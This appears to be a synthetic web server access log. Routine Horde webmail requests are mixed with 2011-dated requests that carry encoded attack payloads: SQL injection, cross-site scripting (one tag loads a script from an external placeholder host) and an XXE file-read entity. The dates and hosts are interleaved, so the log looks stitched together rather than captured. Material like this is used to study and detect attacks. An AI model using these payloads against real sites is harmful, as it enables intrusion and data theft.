192.168.10.81 - - [29/Feb/2020:00:00:02 +0000] "GET /themes/default/graphics/alerts/success.png HTTP/1.1" 200 737 "http://mail.spiral.com/themes/default/screen.css" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
239.76.215.8 - - [14/Feb/2011:22:59:15 +0000] "GET /main9.php?name1=admin%27+or+1%3D1%2F%2A HTTP/1.1" 200 1150 "http://www.jones.info/mainpage/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
192.168.10.130 - - [29/Feb/2020:00:00:03 +0000] "GET /nag/task.php?actionID=add_task HTTP/1.1" 200 8991 "http://mail.spiral.com/nag/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/77.0.3865.90 HeadlessChrome/77.0.3865.90 Safari/537.36"
35.33.190.205 - - [14/Feb/2011:22:59:15 +0000] "GET /register.php?name10=%3Cscript%2Bsrc%3D%22%3E%22%2Bsrc%3D%22http%3A%2F%2Fyoursite.com%2Fxss.js%3F69%2C69%22%3E%3C%2Fscript%3E HTTP/1.1" 200 7947 "http://www.jones.info/main/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36"
192.168.10.81 - - [29/Feb/2020:00:00:09 +0000] "GET /services/prefs.php?app=horde HTTP/1.1" 200 3794 "http://mail.spiral.com/services/prefs.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
192.168.10.130 - - [29/Feb/2020:00:04:09 +0000] "GET /services/portal/ HTTP/1.1" 200 6499 "http://mail.spiral.com/services/prefs.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
192.168.10.130 - - [29/Feb/2020:00:04:13 +0000] "GET /turba/ HTTP/1.1" 200 4353 "http://mail.spiral.com/services/portal/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
35.33.190.205 - - [14/Feb/2011:22:59:15 +0000] "GET /register.php?name10=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E HTTP/1.1" 200 7947 "http://www.jones.info/main/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36"
192.168.10.81 - - [29/Feb/2020:00:00:11 +0000] "GET /services/prefs.php?app=imp HTTP/1.1" 200 4168 "http://mail.spiral.com/services/prefs.php?app=horde" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
144.169.55.103 - - [14/Feb/2011:22:59:15 +0000] "GET /main4.php?email=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE+foo+%5B%3C%21ELEMENT+foo+ANY%3E%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fdev%2Frandom%22%3E%5D%3E%3Cfoo%3E%26xee%3B%3C%2Ffoo%3E HTTP/1.1" 200 4151 "http://www.jones.info/test/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
192.168.10.81 - - [29/Feb/2020:00:00:12 +0000] "GET /imp/themes/default/screen.css HTTP/1.1" 200 3272 "http://mail.spiral.com/services/prefs.php?app=imp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
